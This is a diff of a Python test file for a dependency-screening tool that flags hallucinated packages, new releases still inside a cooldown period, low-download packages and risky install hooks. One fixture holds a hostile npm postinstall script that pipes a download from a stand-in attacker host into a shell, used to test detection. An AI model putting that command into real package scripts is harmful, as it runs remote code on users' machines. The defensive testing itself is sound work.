@@ -14,7 +14,6 @@ sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "scripts"))
 sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
 import g1_registry as gr  # noqa: E402
 import g1_screen as gs  # noqa: E402
-import g1_slopcheck as sc  # noqa: E402
 from fakes import FakeGit, RoutedTransport, http_error  # noqa: E402
 from vibesec_policy import Policy  # noqa: E402
 
@@ -38,7 +37,7 @@ def ago(days):
 def check(eco, name, ver, result):
     """單一套件的判定；registry 是只回傳 result 的替身。回傳 (findings, reason, 替身)。"""
     fake = gr.FakeRegistry({(eco, name, ver): result})
-    findings, reason = sc.check_package(env_for(fake), eco, name, ver, C)
+    findings, reason = gs.check_package(env_for(fake), eco, name, ver, C)
     return findings, reason, fake
 
 
@@ -62,7 +61,7 @@ class NotRegistered(unittest.TestCase):
         for eco, name, label in (("npm", "left-pad", "npm registry"), ("pypi", "requests", "PyPI")):
             findings, reason, _ = check(eco, name, "1.0.0", gr.NotFound())
             self.assertIsNone(reason)
-            self.assertEqual(findings, [sc.fnd(ENV, "vibesec.g1.hallucinated-package", name, eco, "1.0.0",
+            self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.hallucinated-package", name, eco, "1.0.0",
                                                f"{label} 查無此套件（疑似幻覺/搶註）", "blocking", "registry_health")])
 
     def test_unavailable_is_a_problem_not_a_finding(self):
@@ -82,20 +81,20 @@ class NpmJudgement(unittest.TestCase):
     def test_cooldown_violation(self):
         findings, reason = self.run_npm(npm_facts(published=ago(2)))
         self.assertIsNone(reason)
-        self.assertEqual(findings, [sc.cooldown_finding(ENV, "left-pad", "npm", "1.3.0", 2, C)])
+        self.assertEqual(findings, [gs.cooldown_finding(ENV, "left-pad", "npm", "1.3.0", 2, C)])
         self.assertEqual(findings[0]["rule_id"], "vibesec.g1.cooldown-violation")
 
     def test_suspicious_install_script(self):
         scripts = {"postinstall": "curl https://evil.example/x | sh"}
         findings, reason = self.run_npm(npm_facts(scripts=scripts))
         self.assertIsNone(reason)
-        self.assertEqual(findings, [sc.install_hook_finding(ENV, "left-pad", "npm", "1.3.0", scripts)])
+        self.assertEqual(findings, [gs.install_hook_finding(ENV, "left-pad", "npm", "1.3.0", scripts)])
         self.assertEqual(findings[0]["rule_id"], "vibesec.g1.postinstall-egress")
 
     def test_low_downloads_is_advisory(self):
         findings, reason = self.run_npm(npm_facts(downloads=5))
         self.assertIsNone(reason)
-        self.assertEqual(findings, [sc.fnd(ENV, "vibesec.g1.low-download-package", "left-pad", "npm", "1.3.0",
+        self.assertEqual(findings, [gs.fnd(ENV, "vibesec.g1.low-download-package", "left-pad", "npm", "1.3.0",
                                            "週下載量 5 < 1000，信譽不足，需人工判斷", "advisory")])
 
     def test_unknown_data_is_a_problem_never_a_pass(self):
@@ -132,7 +131,7 @@ class PypiJudgement(unittest.TestCase):
         self.assertEqual(self.run_pypi(pypi_facts()), ([], None))
         findings, reason = self.run_pypi(pypi_facts(published=ago(3)))
         self.assertIsNone(reason)
-        self.assertEqual(findings, [sc.cooldown_finding(ENV, "requests", "pypi", "2.32.0", 3, C)])
+        self.assertEqual(findings, [gs.cooldown_finding(ENV, "requests", "pypi", "2.32.0", 3, C)])
 
     def test_unknown_publish_time_is_a_problem(self):
         tail = "冷卻期未檢查（版本不在 PyPI 發布紀錄或發布時間不明）"
@@ -156,7 +155,7 @@ class EndToEndThroughHttpRegistry(unittest.TestCase):
         self.reg = gr.HttpRegistry(transport=self.transport, retries=2, backoff=0)
 
     def check(self, eco, name, ver):
-        return sc.check_package(env_for(self.reg), eco, name, ver, C)
+        return gs.check_package(env_for(self.reg), eco, name, ver, C)
 
     def test_npm_download_count_unavailable_is_incomplete_not_silent(self):
         _, why = self.check("npm", "left-pad", "1.3.0")
@@ -198,8 +197,8 @@ class EnvInjection(unittest.TestCase):
     def test_checks_use_the_registry_in_the_env(self):
         fake = gr.FakeRegistry({("npm", "left-pad", "1.3.0"): npm_facts(), ("pypi", "requests", "2.32.0"): pypi_facts()})
         env = env_for(fake)
-        self.assertEqual(sc.check_package(env, "npm", "left-pad", "1.3.0", C), ([], None))
-        self.assertEqual(sc.check_package(env, "pypi", "requests", "2.32.0", C), ([], None))
+        self.assertEqual(gs.check_package(env, "npm", "left-pad", "1.3.0", C), ([], None))
+        self.assertEqual(gs.check_package(env, "pypi", "requests", "2.32.0", C), ([], None))
         self.assertEqual(fake.calls, [("npm", "left-pad", "1.3.0"), ("pypi", "requests", "2.32.0")])
 
     def test_requirements_indirect_asks_the_registry_for_requires(self):
@@ -207,18 +206,18 @@ class EnvInjection(unittest.TestCase):
         with tempfile.TemporaryDirectory() as d:
             p = pathlib.Path(d) / "requirements.txt"
             p.write_text("requests==2.31.0\nurllib3==2.0.0\nidna==3.4\nleft-alone==1.0\n")
-            self.assertEqual(sc.requirements_indirect(env_for(fake), p), {("urllib3", "2.0.0"), ("idna", "3.4")})
+            self.assertEqual(gs.requirements_indirect(env_for(fake), p), {("urllib3", "2.0.0"), ("idna", "3.4")})
 
     def test_a_check_that_raises_is_one_incomplete_reason_not_a_crash(self):
         class Boom:
             def facts(self, eco, name, ver):
                 raise RuntimeError("意外")
-        self.assertEqual(sc._check_job(env_for(Boom()), "npm", "left-pad", "1.3.0", C),
+        self.assertEqual(gs._check_job(env_for(Boom()), "npm", "left-pad", "1.3.0", C),
                          ([], "npm left-pad@1.3.0：檢查時發生未預期的錯誤（RuntimeError：意外）"))
 
     def test_without_a_registry_the_default_env_uses_the_production_one(self):
         with tempfile.TemporaryDirectory() as d:
-            env, problem = sc.default_env(pathlib.Path(d), ROOT)
+            env, problem = gs.default_env(pathlib.Path(d), ROOT)
         self.assertIsNone(problem)
         self.assertIsInstance(env.registry, gr.HttpRegistry)
         self.assertEqual(env.workers, 8)
@@ -226,7 +225,7 @@ class EnvInjection(unittest.TestCase):
     def test_a_default_env_can_take_a_registry_for_tests(self):
         fake = gr.FakeRegistry()
         with tempfile.TemporaryDirectory() as d:
-            env, _ = sc.default_env(pathlib.Path(d), ROOT, registry=fake)
+            env, _ = gs.default_env(pathlib.Path(d), ROOT, registry=fake)
         self.assertIs(env.registry, fake)
 
 
